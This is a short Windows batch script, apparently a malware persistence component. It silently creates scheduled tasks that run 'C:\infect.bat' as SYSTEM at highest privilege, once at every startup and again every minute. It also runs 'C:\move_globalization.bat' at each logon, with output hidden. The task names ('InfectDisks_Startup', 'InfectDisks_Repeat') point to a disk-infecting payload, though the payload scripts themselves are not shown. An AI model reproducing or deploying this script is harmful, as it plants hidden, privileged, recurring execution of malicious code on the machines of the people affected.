echo off
schtasks /create /tn "InfectDisks_Startup" /tr "C:\infect.bat" /sc ONSTART /rl HIGHEST /RU SYSTEM /f >nul
schtasks /create /tn "InfectDisks_Repeat" /tr "C:\infect.bat" /sc MINUTE /mo 1 /rl HIGHEST /RU SYSTEM /f >nul
schtasks /create /tn "MoveGlobalization" /tr "C:\move_globalization.bat" /sc ONLOGON /rl HIGHEST /f >nul
exit